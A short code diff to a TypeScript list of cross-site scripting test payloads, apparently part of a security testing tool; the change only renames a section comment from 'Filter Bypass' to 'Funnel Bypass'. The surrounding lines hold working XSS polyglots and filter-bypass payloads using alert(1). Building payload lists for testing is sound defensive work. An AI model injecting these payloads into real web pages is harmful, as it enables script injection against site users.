@@ -53,7 +53,7 @@ export const XSS_PAYLOADS: XssPayload[] = [
   { id: 'p5', category: 'polyglot', label: 'Semicolon alert', payload: '\\";alert(1);//' },
   { id: 'p6', category: 'polyglot', label: 'Comment polyglot', payload: '<script>alert(1)</script><!--' },
 
-  // ── Filter Bypass ───────────────────────────────────────
+  // ── Funnel Bypass ───────────────────────────────────────
   { id: 'f1', category: 'filter-bypass', label: 'Case variation', payload: '<ScRiPt>alert(1)</ScRiPt>' },
   { id: 'f2', category: 'filter-bypass', label: 'fromCharCode', payload: '<script>alert(String.fromCharCode(49))</script>' },
   { id: 'f3', category: 'filter-bypass', label: 'Unicode escape', payload: '<script>\\u0061lert(1)</script>' },
